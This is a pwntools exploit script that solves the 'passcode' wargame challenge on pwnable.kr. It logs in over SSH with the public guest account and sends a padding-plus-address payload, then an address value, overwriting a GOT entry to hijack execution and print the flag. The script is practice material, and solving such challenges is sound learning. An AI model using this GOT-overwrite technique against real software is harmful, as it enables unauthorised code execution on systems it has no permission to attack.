#! /usr/bin/python
from pwn import *

# ssh 
s = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')

# process
p = s.process('./passcode')
print(p.recv())

# payload 1 : GOT hijacking 
p.sendline(b'a'*96 + b'\x00\xa0\x04\x08')
print(p.recv())


# payload 2 : GOT overwirte
printf_got = str(int(0x80485d7))       # printf@plt
success("printf@got : %s" %printf_got)
p.sendline(printf_got)                 # printf@got -> printf@plt

# receive flag
print(p.recv())
print(p.recv())